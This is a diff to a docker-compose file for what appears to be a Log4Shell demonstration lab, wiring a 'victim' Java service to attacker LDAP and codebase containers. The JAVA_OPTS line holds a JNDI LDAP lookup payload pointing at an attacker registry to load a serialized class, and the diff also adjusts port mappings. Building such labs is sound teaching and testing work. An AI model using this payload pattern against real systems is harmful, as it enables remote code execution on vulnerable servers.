@@ -10,7 +10,7 @@ services:
         APP_NAME: "victim"
     environment:
       JAVA_OPTS: >-
-        -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=made-class,dc=ldap-registry,dc=attacker}
+        -Dvictim-payload=$${jndi:ldap://attacker_ldap_registry:1389/cn=serialized-class,dc=ldap-registry,dc=attacker}
     depends_on:
       - attacker_ldap_registry
       - attacker_ldap_registry_setup
@@ -36,7 +36,7 @@ services:
       LDAP_EXTRA_SCHEMAS: "cosine,inetorgperson,nis,java,corba"
       LDAP_ALLOW_ANON_BINDING: "yes"
     ports:
-    - ":1389"
+    - "1389:1389"
 
   # The LDAP registry must be initialized with data. The `Reference` must be
   # placed into the directory. This could easily be done with an LDIF file on
@@ -63,4 +63,4 @@ services:
       context:    ${PWD}/src/attacker_codebase
       dockerfile: ${PWD}/docker/gradle-java-codebase.Dockerfile
     ports:
-    - ":80"
+    - "8080:80"
